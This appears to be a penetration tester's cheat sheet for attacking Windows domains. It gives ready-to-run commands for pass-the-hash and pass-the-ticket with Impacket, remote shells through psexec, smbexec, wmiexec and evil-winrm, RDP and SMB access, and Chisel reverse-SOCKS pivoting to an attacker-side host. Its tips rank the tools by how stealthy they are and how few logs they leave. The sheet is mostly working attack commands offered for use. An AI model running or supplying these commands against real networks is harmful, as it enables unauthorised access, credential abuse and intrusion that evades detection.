1. PTK/PTH

```
# PTH/PTK
# Request ticket
getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
getTGT.py <domain_name>/<user_name>:[password]

# Set ticket
export KRB5CCNAME=<TGT_ccache_file>

# Use it
psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
psexec.py -hashes 'hash' -dc-ip 10.10.10.10 username@10.10.10.10
smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```



Movement
```
# ALWAYS TRY WMIEXEC first
shell executed through Windows Management Instrumentation, doesnt drop a file or exe on the host and generates fewer logs, very stealthy. This launches a new cmd.exe each time it runs a command. Then generates event ID 4688: A new process has been created. It also runs under the context of a user not as system.
	impacket-wmiexec domain/username:'password'@x.x.x.x

# impacket-psexec 
- psexec - uploads randomly-named executable to the ADMIN$ share. Registers the service via RPC and the windows service control manager. Not stealthy at all.
	impacket-psexec 'comapany/username:'password'@X.X.X.X'

# winrm
wmiexec- doesnt drop any files and is stealthier.  It runs the local user we connected with. Most modern AV catches this.
impacket-wmiexec 'domain/user:password@X.X.X.X'

# evil-winrm
nmap p5985,5986 X,X,X,X 
evil-winrm -i X.X.X.X -u USER -p PASS 
evil-winrm -i X.X.X.X -u USER -p PASS  -S  #SSL
evil-winrm -i X.X.X.X -u USER -H <HASH>  #hash only second part needed

# Impacket-smbexec
impacket-smbexec 'domain/user:password@X.X.X.X'

# SMB Connect
smbclient \\\\X.X.X.X\C$ -u domain/username
```

RDP Connections
```
# Remotely
	xfreerdp /u:user@domain /p:password /v:x.x.x.x
```


2. Pivoting
Chisel
```
#Alter the config file
change socksproxy file /etc/proxychains.config

#Client Run
.\chisel client 192.168.45.196:8001 R:
9050:socks

#Server Run
/chisel server -p 8001 --reverse  
```
